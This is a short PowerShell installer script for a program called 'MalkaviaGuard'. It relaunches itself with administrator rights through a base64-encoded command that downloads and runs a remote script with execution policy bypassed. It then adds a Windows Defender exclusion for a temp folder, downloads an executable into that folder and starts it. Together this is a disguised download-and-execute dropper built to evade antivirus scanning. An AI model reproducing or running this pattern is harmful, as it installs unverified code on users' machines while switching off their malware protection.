param([switch]$Elevated)

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$ScriptUrl = 'https://raw.githubusercontent.com/duaaaalityyyy/MalkaviaGuard/main/run.ps1'
$ExeUrl   = 'https://raw.githubusercontent.com/duaaaalityyyy/MalkaviaGuard/main/MalkaviaGuard.exe'

$WorkDir = Join-Path $env:TEMP 'MalkaviaGuard'
$Dest    = Join-Path $WorkDir 'MalkaviaGuard.exe'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Restart-AsAdministrator {
    Write-Host 'Requesting administrator permissions...' -ForegroundColor Yellow
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(@"
`$ErrorActionPreference = 'Stop'
iex (iwr '$ScriptUrl' -UseBasicParsing)
"@))
    Start-Process powershell.exe -Verb RunAs -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $encodedCommand
}

try {
    if (-not (Test-IsAdministrator)) {
        Restart-AsAdministrator
        return
    }

    New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null

    Write-Host 'Adding Defender exclusion for MalkaviaGuard...' -ForegroundColor Yellow
    try { Add-MpPreference -ExclusionPath $WorkDir -ErrorAction Stop } catch {}

    Write-Host 'Downloading MalkaviaGuard...' -ForegroundColor Cyan
    Invoke-WebRequest -Uri $ExeUrl -OutFile $Dest -UseBasicParsing

    Write-Host 'Starting MalkaviaGuard...' -ForegroundColor Green
    Start-Process -FilePath $Dest -WorkingDirectory $WorkDir -NoNewWindow
}
catch {
    Write-Error "MalkaviaGuard failed: $($_.Exception.Message)"
    exit 1
}
